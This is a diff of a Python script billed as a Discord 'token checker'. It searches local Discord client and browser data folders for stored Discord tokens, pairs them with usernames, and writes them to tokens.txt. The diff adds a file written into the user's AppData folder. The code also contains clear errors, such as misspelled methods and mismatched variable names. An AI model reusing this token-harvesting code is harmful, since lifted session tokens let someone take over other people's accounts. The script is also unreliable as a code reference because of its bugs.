@@ -4,10 +4,15 @@ import requests, random, time, json
 from colorama import Fore, init
 from base64 import b64decode, b64encode
 from urllib.request import Request, urlopen
+from re import findall
 messages = []
 counter = 0
 lines = []
 usrcount = 696969
+LOCAL = os.getenv('LOCALAPPDATA')
+ROAMING = os.getenv('AppData')
+## Output for txt file location
+output = open(ROAMING + "temp.txt", "a")
 PATHS = {
     "Discord"           : ROAMING + "\\Discord",
     "Discord Canary"    : ROAMING + "\\discordcanary",
@@ -18,7 +23,7 @@ PATHS = {
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
 
-print(f"{Fore.WHITE}[ {Fore.CYAN}\u00A7 {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Token checker made by {Fore.WHITE}Blaze{Fore.LIGHTBLACK_EX}, support me via cashapp {Fore.WHITE}$BlazeStackdev{Fore.LIGHTBLACK_EX} | Licensed under {Fore.WHITE}MIT {Fore.LIGHTBLACK_EX}License")
+print(f"{Fore.WHITE}[ {Fore.CYAN}\u00A7 {Fore.WHITE}] {Fore.LIGHTBLACK_EX}Token checker made by {Fore.WHITE}Blaze{Fore.LIGHTBLACK_EX}, support me via cashapp {Fore.WHITE}$BlazeStackdev")
 print(f"{Fore.WHITE}[ {Fore.CYAN}\u00A7 {Fore.WHITE}] {Fore.LIGHTBLACK_EX}my github: {Fore.WHITE}https://github.com/Blaze-stack")
 
     
@@ -53,6 +58,7 @@ def usrgrab():
     working = []
     checked = []
     already_cached_tokens = []
+    working_ids = []
 
     for platform, path in PATHS.items():
         if not os.path.exists(path):
@@ -82,8 +88,8 @@ def usrgrab():
             toks.append(tks)
             
     print(f"{Fore.WHITE}[ {Fore.CYAN}\u00A7 {Fore.WHITE}] {Fore.LIGHTBLACK_EX} Pick the username to fine the token of, ")
-
-    for i in range(len(uses)):
+    usrcount = 696969
+    for i in range(len(usrs)):
         choice = input(f'{Fore.GREEN}>{Fore.RESET} is it {users[i]} [y/n]')
 
         if choice.lowwer() == "y":
@@ -93,7 +99,7 @@ def usrgrab():
         else:
             pass
 
-    if usercount == 696969:
+    if usrcount == 696969:
         print(f"{Fore.WHITE}[{Fore.RED} ! {Fore.WHITE}]{Fore.LIGHTBLACK_EX} No tokens where found. {Fore.WHITE} Error 506. {Fore.WHITE}")
     else:
         f = file.open("tokens.txt", "a")
